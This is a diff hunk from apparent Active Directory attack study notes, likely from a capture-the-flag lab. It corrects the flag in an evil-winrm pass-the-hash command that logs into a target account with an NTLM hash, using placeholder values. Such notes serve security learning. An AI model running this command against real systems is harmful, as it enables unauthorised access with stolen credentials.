@@ -328,7 +328,7 @@ Which ACE would allow you to update any non-protected parameter of a target obje
 
 PASS THE HASH:
     Get access to the User account via Hash NTLM by using Evil-winrm:
-        evil-winrm i- <TargetIP> -u <NLTMUserName> -H <LAST PART OF THE NTLM HASH>
+        evil-winrm -i <TargetIP> -u <NLTMUserName> -H <LAST PART OF THE NTLM HASH>
 
 
 
